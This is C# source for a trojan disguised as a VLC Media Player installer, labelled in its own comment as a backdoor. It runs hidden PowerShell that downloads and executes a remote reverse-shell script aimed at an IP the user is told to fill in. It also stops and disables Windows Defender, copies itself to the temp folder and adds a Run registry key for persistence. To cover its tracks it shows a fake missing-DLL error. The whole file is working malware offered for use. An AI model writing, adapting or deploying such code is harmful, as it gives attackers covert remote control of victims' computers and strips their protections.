using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using System.Windows;
using System.Windows.Forms;
using System.Net.NetworkInformation;
using System.ServiceProcess;

// Fake VLC Media Player installer Backdoor Made in C# by TWC aka Hacker Pro 2.0 

namespace backdoor
{
    class Class1
    {
        static void Main(string[] args)
        { 
            ProcessStartInfo backdoor = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoP -NonI -WindowStyle Hidden -Exec Bypass -Command IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 127.0.0.1 54", // replace 127.0.0.1 with an actual ip and if you want change port but remember to change it to the cmd too  
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            Process process = new Process { StartInfo = backdoor };
            process.Start();

            string serviceName = "WinDefend";

            ServiceController serviceController = new ServiceController(serviceName);

            try
            {
                if (serviceController.Status != ServiceControllerStatus.Stopped)
                {
                    serviceController.Stop();
                    serviceController.WaitForStatus(ServiceControllerStatus.Stopped);
                }
                else
                {
                    Process.Start("cmd.exe /c taskkill /f /im MsMpEng.exe");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error service: {ex.Message}");
            }

            try
            {
                string assemblyPath = Assembly.GetExecutingAssembly().Location;

                string tempDir = Path.GetTempPath();

                string copyPath = Path.Combine(tempDir, Path.GetFileName(assemblyPath));

                File.Copy(assemblyPath, copyPath, true);

                AddToStartupRegistry(copyPath);
            }
            catch (Exception ex)
            {

            }

            ProcessStartInfo disdef = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoP -NonI -WindowStyle Hidden -Exec Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $true; Stop-Service -Name WinDefend; Set-Service -Name WinDefend -StartupType Disabled",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            Process disdefprocess = new Process() { StartInfo = disdef };
            disdefprocess.Start();

            System.Windows.MessageBox.Show("This application failed to start because msointl.dll was not found. Re-Installing the application may fix this problem.", "VLC Media Player Installer - System Error", MessageBoxButton.OK, MessageBoxImage.Error);

            System.Timers.Timer timer = new System.Timers.Timer();
            timer.Interval = 10000;
            timer.Elapsed += TimerElapsed;
            timer.AutoReset = false;
            timer.Start();

            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            Console.ReadLine();

            process.WaitForExit();


            Console.WriteLine("Output: " + output);
            Console.WriteLine("Error:" + error);
        }


        static void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            Environment.Exit(0);
        }

        static void AddToStartupRegistry(string executablePath)
        {
            const string keyName = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            const string valueName = "1";

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true))
            {
                if (key != null)
                {
                    key.SetValue(valueName, executablePath);
                }
            }
        }
    }
}
